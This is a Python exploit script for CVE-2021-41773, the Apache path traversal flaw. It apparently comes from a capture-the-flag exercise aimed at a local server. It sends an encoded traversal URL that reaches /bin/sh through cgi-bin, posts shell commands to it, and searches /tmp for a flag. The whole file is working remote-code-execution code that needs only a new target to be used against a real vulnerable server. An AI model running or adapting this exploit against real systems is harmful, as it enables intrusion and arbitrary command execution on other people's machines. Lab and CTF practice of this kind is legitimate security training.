#!/usr/bin/env python3
import requests
import re
import urllib3
import base64

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target configuration
target_url = "http://127.0.0.1:33211/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (RCE Exploit)'
}

print("[*] CVE-2021-41773 RCE Exploit - Extracting FLAG from /tmp")
print(f"[*] Target: {target_url}")
print("=" * 60)

# Function to execute shell commands via RCE
def execute_command(cmd):
    """Execute shell command via RCE and return output"""
    try:
        # Format: echo;[COMMAND] to get clean output
        data = f"echo;{cmd}"
        
        print(f"\n[+] Executing: {cmd}")
        print("-" * 40)
        
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            verify=False,
            timeout=30
        )
        
        print(f"[*] Status Code: {response.status_code}")
        
        if response.status_code == 200:
            # Extract command output (after the initial echo)
            output = response.text.strip()
            print(f"[*] Raw Response Length: {len(output)} bytes")
            
            # Print the first 500 chars to avoid overwhelming output initially
            if len(output) > 500:
                print(f"[*] Response Preview (first 500 chars):\n{output[:500]}")
            else:
                print(f"[*] Response:\n{output}")
                
            return output
        else:
            print(f"[!] Unexpected status code: {response.status_code}")
            print(f"[!] Response: {response.text}")
            return None
            
    except requests.exceptions.Timeout:
        print(f"[!] Timeout executing command: {cmd}")
        return None
    except Exception as e:
        print(f"[!] Error executing command: {e}")
        return None

# Step 1: List /tmp directory contents
print("\n[*] STEP 1: Listing /tmp directory contents")
ls_output = execute_command("ls -la /tmp")

if ls_output:
    # Step 2: Search for flag files
    print("\n[*] STEP 2: Searching for flag files in /tmp")
    
    # Try multiple methods to find the flag
    methods = [
        "find /tmp -iname '*flag*' -type f 2>/dev/null",
        "find /tmp -iname '*FLAG*' -type f 2>/dev/null", 
        "grep -r 'FLAG{' /tmp/ 2>/dev/null | head -20",
        "find /tmp -type f -name '*.txt' 2>/dev/null",
        "ls -la /tmp/ | grep -i flag"
    ]
    
    flag_file = None
    grep_output = None
    
    for method in methods:
        output = execute_command(method)
        
        if output and len(output.strip()) > 0:
            print(f"\n[+] Found potential flag data!")
            
            # Check for FLAG{ pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', output)
            if flag_match:
                print(f"[!] FLAG FOUND: {flag_match.group(0)}")
                grep_output = output
                break
            
            # Check if this looks like a file listing with flag
            if 'flag' in output.lower() and '/' in output:
                # Try to extract filename
                lines = output.strip().split('\n')
                for line in lines:
                    if 'flag' in line.lower():
                        # Extract filename from ls -la or find output
                        parts = line.split()
                        if len(parts) >= 9:
                            potential_file = parts[-1]
                            if not potential_file.startswith('/'):
                                potential_file = f"/tmp/{potential_file}"
                            
                            print(f"[+] Checking if {potential_file} exists...")
                            test_output = execute_command(f"test -f {potential_file} && echo 'FILE_EXISTS' || echo 'NO_FILE'")
                            if test_output and 'FILE_EXISTS' in test_output:
                                flag_file = potential_file
                                print(f"[+] Confirmed file exists: {flag_file}")
                                break
            
            if flag_file:
                break
    
    # If we found a flag file, read it
    if flag_file:
        print(f"\n[*] STEP 3: Reading flag file: {flag_file}")
        flag_content = execute_command(f"cat {flag_file}")
        
        if flag_content:
            print(f"\n[!] FLAG FILE CONTENTS:\n{flag_content}")
            
            # Search for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', flag_content)
            if flag_match:
                print(f"\n[!] SUCCESS: FLAG FOUND: {flag_match.group(0)}")
            else:
                print(f"[!] File read but no FLAG{{}} pattern found")
    
    # If grep found FLAG directly
    elif grep_output:
        print(f"[!] FLAG already extracted via grep:\n{grep_output}")
    
    else:
        print("[!] No flag files found with standard methods")
        print("[*] Trying additional search patterns...")
        
        # Try some alternative approaches
        alt_methods = [
            "ls -la /tmp/",
            "ls -la /tmp/ | grep -v total",
            "for file in /tmp/*; do echo \"$file:\"; cat \"$file\" 2>/dev/null | head -5; done",
            "find /tmp -type f -exec grep -l 'FLAG' {} \\; 2>/dev/null"
        ]
        
        for method in alt_methods:
            output = execute_command(method)
            if output and 'FLAG{' in output:
                print(f"[!] FLAG FOUND in output:")
                print(output)
                break

else:
    print("[!] Failed to list /tmp directory")

print("\n[*] Exploit execution completed")
